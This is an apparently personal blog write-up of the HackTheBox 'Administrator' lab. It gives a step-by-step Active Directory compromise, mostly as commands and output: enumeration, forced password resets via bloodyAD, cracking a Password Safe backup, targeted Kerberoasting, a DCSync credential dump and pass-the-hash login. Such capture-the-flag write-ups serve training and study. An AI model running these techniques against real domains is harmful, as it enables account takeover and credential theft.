---
title: HackTheBox - Administrator
date: 2025-04-03 02:30:00 +/-TTTT
categories: [boxes, red-teaming]
tags: [GetChangesAll]     # TAG names should always be lowercase
image : /assets/images/Gb3oaZMWAAA4z0N.jpg
---

As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich

Before start i realized
## Entry
### nmap

```bash
Discovered open port 445/tcp on 10.10.11.42
Discovered open port 21/tcp on 10.10.11.42
Discovered open port 135/tcp on 10.10.11.42
Discovered open port 53/tcp on 10.10.11.42
Discovered open port 139/tcp on 10.10.11.42
Discovered open port 3268/tcp on 10.10.11.42
Discovered open port 636/tcp on 10.10.11.42
Discovered open port 593/tcp on 10.10.11.42
Discovered open port 5985/tcp on 10.10.11.42
Discovered open port 389/tcp on 10.10.11.42
Discovered open port 88/tcp on 10.10.11.42
Discovered open port 464/tcp on 10.10.11.42
Discovered open port 3269/tcp on 10.10.11.42
```

i realized there is 21 port is open which is FTP so it would be interesting later

```bash
➜  administrator nxc smb 10.10.11.42
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
```

we can grab username list with

```bash
➜  administrator nxc smb 10.10.11.42 -u Olivia -p ichliebedich --users
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\Olivia:ichliebedich 
SMB         10.10.11.42     445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-   
SMB         10.10.11.42     445    DC               Administrator                 2024-10-22 18:59:36 0       Built-in account for administering the computer/domain
SMB         10.10.11.42     445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.10.11.42     445    DC               krbtgt                        2024-10-04 19:53:28 0       Key Distribution Center Service Account
SMB         10.10.11.42     445    DC               olivia                        2024-10-06 01:22:48 0        
SMB         10.10.11.42     445    DC               michael                       2024-10-06 01:33:37 0        
SMB         10.10.11.42     445    DC               benjamin                      2024-10-06 01:34:56 0        
SMB         10.10.11.42     445    DC               emily                         2024-10-30 23:40:02 0        
SMB         10.10.11.42     445    DC               ethan                         2024-10-12 20:52:14 0        
SMB         10.10.11.42     445    DC               alexander                     2024-10-31 00:18:04 0        
SMB         10.10.11.42     445    DC               emma                          2024-10-31 00:18:35 0 
```

full users list

```bash
➜  administrator cat nxcusers.txt | awk '{print $5}' > users.txt                                         
➜  administrator cat users.txt 
Administrator
Guest
krbtgt
olivia
michael
benjamin
emily
ethan
alexander
emma
```

Lets see if we have LDAP access then we can dump BH data

```bash
➜  administrator nxc ldap 10.10.11.42 -u Olivia -p ichliebedich    
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.42     389    DC               [+] administrator.htb\Olivia:ichliebedich
```

and yeah lets go

```bash
➜  administrator nxc ldap DC.administrator.htb -u Olivia -p ichliebedich --bloodhound --dns-server 10.10.11.42 --collection all
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.42     389    DC               [+] administrator.htb\Olivia:ichliebedich 
LDAP        10.10.11.42     389    DC               Resolved collection methods: rdp, container, acl, localadmin, objectprops, psremote, dcom, trusts, session, group
LDAP        10.10.11.42     389    DC               Done in 00M 17S
LDAP        10.10.11.42     389    DC               Compressing output into /root/.nxc/logs/DC_10.10.11.42_2025-03-15_001725_bloodhound.zip

```

### Analyze-Bloodhound

![alt text](<../assets/images/Screenshot 2025-03-15 at 00-19-03 BloodHound.png>)

we have full privileges on michael we can change his password
![alt text](<../assets/images/Screenshot 2025-03-15 at 00-19-41 BloodHound.png>)

and michael can do same things for benjamin. so lets change password olivia → michael → benjamin

### GenericAll and ForceChangePassword
![alt text](<../assets/images/Screenshot 2025-03-15 at 00-21-12 BloodHound.png>)

u can use [autobloodyAD](https://github.com/lineeralgebra/autobloodyAD)
![alt text](<../assets/images/Screenshot_2025-03-15_00_22_36.png>)

```bash
➜  administrator bloodyAD --host DC.administrator.htb -d administrator.htb -u olivia -p ichliebedich set password michael NewPassword123

[+] Password changed successfully!
```

and for benjamin same command

```bash
➜  administrator bloodyAD --host DC.administrator.htb -d administrator.htb -u michael -p NewPassword123 set password benjamin NewPassword123

[+] Password changed successfully!
```
![alt text](<../assets/images/Screenshot 2025-03-15 at 00-23-55 BloodHound(1).png>)

so lets access FTP with benjamin

```bash
➜  administrator ftp administrator.htb
Connected to administrator.htb.
220 Microsoft FTP Service
Name (administrator.htb:elliot): benjamin
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||62368|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||62369|)
125 Data connection already open; Transfer starting.
100% |*********************************************************************************|   952       11.32 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (11.29 KiB/s)
```

BOOMMMMM!!!!

### Password Safe V3 database

```bash
➜  administrator file Backup.psafe3
Backup.psafe3: Password Safe V3 database
```
![alt text](<../assets/images/Screenshot 2025-03-15 at 00-27-18 password safe v3 database crack - Google Search.png>)

and its alredy on kali

```bash
➜  administrator pwsafe2john Backup.psafe3 
Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050

```

```bash
➜  administrator john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (Backu)  
```
u can open with

```bash
pwsafe Backup.psafe3 
```

![alt text](<../assets/images/pwsafe1.png>)

![alt text](<../assets/images/pwsafe2.png>)

```sh
alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
```
![alt text](<../assets/images/Screenshot 2025-03-15 at 00-35-43 BloodHound.png>)

emily has GenericWrite on Ethan

### targetedkerberoast

```bash
faketime '2025-03-15 07:41:53' python3 targetedKerberoast.py -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" -d "administrator.htb" --dc-ip 10.10.11.42

```
![alt text](<../assets/images/Screenshot_2025-03-15_00_41_23.png>)

and its crackable

```bash
➜  administrator john ethan_hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
limpbizkit       (?) 
```

and booommm!!! we alraedy pwned
![alt text](<../assets/images/Screenshot 2025-03-15 at 00-42-56 BloodHound.png>)

```bash
➜  administrator python3 /opt/impacket/examples/secretsdump.py "administrator.htb/ethan:limpbizkit"@"dc.administrator.htb"
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:20688f5fcfa2354f667523a73a3d1951:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:20688f5fcfa2354f667523a73a3d1951:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:fe55cce327946e7cd06731b30543ced8d2fdca1a31295e76944bb778b29f94ca
administrator.htb\michael:aes128-cts-hmac-sha1-96:2b3db3d7eb33df18b70dd91ca55c8a27
administrator.htb\michael:des-cbc-md5:51bfeaa12c1c9df4
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:df33c40f0effaca2690e6fccf496d2ff9571d4eba95e13e860c61ccbe3cdd775
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:b5f81b94e4dab96b43083628add6f480
administrator.htb\benjamin:des-cbc-md5:7c0e4998f4ece30b
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
```

here

```bash
➜  administrator evil-winrm -i administrator.htb -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                                     
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

